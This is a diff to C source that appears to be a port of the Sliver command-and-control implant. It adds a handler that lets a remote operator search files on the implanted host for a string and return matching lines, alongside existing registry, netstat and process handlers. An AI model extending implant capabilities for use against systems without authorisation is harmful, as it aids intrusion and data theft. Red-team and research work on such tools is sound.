@@ -792,6 +792,65 @@ static int handle_execute_children(const sliver_envelope_t *req, sliver_buf_t *o
                                         n < 0 ? "execute-children: enumeration failed" : NULL);
 }
 
+
+/* --- grep --------------------------------------------------------------- */
+/* Line-oriented substring search (the Go implant uses regexp; a plain match
+ * covers the common cases and keeps the C side dependency-free). */
+static int grep_file(const char *path, const char *pattern, sliver_grep_hit_t *hits,
+                     char (*lines)[512], int max) {
+  FILE *f;
+  char line[512];
+  int count = 0;
+  int64_t number = 0;
+
+  f = fopen(path, "rb");
+  if (f == NULL) {
+    return -1;
+  }
+  while (count < max && fgets(line, sizeof(line), f) != NULL) {
+    size_t n = strlen(line);
+    number++;
+    while (n > 0 && (line[n - 1] == '\n' || line[n - 1] == '\r')) {
+      line[--n] = 0;
+    }
+    if (strstr(line, pattern) != NULL) {
+      (void)snprintf(lines[count], sizeof(lines[0]), "%s", line);
+      hits[count].line_number = number;
+      hits[count].line = lines[count];
+      count++;
+    }
+  }
+  (void)fclose(f);
+  return count;
+}
+
+static int handle_grep(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char pattern[256];
+  char path[512];
+  int recursive = 0;
+  int before = 0;
+  int after = 0;
+  sliver_grep_hit_t hits[128];
+  static char lines[128][512];
+  int n;
+
+  if (sliver_grep_req_decode(req->data, req->data_len, pattern, sizeof(pattern), path, sizeof(path),
+                             &recursive, &before, &after) != 0) {
+    return -1;
+  }
+  (void)before;
+  (void)after;
+  if (pattern[0] == 0 || path[0] == 0) {
+    return sliver_grep_encode(out, path, path, NULL, 0, "grep: missing pattern or path");
+  }
+  n = grep_file(path, pattern, hits, lines, 128);
+  LOG_DEBUG("rpc: grep %s for %s -> %d hit(s)", path, pattern, n);
+  if (n < 0) {
+    return sliver_grep_encode(out, path, path, NULL, 0, "grep: cannot read path");
+  }
+  return sliver_grep_encode(out, path, path, hits, n, NULL);
+}
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -817,6 +876,7 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_NETSTAT_REQ, SLIVER_MSG_NETSTAT, handle_netstat},
     {SLIVER_MSG_MOUNT_REQ, SLIVER_MSG_MOUNT, handle_mount},
     {136, 136, handle_execute_children},
+    {129, 129, handle_grep},
 #if defined(_WIN32)
     {71, 71, handle_reg_read},
     {72, 72, handle_reg_write},
@@ -884,6 +944,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
